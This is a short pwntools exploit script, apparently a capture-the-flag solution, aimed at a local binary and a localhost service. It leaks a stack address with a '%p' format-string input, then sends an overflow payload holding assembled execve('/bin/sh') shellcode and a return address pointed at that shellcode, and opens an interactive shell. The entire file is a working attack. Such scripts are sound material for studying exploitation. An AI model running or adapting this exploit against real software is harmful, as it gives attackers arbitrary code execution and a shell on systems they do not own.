from pwn import *


binary = "src/all"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break *vuln+78
continue
"""

if args.REMOTE:
    p = remote("localhost", 40000)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


### STACK LEAK ###
p.sendline(b'%p')
stack = int(p.recvline().strip().decode(),16)
print("stack: ", hex(stack))


### COMPILE SHELLCODE ###
code = """
xor   rsi, rsi	                # clear rsi
xor   rdx, rdx                  # clear rdx
mov   rdi, rsp                  # stack pointer to /bin/sh
sub   rdi, 43
mov   rax, 59                   # sys_execve
syscall
"""

shellcode = asm(code)


### SEND TO SHELLCODE ###
payload = b'quit\x00' + b'/bin/sh\x00' + shellcode + b'A' * (35 - len(shellcode) - 8)
payload += p64(stack + 13)

p.sendline(payload)

p.interactive()
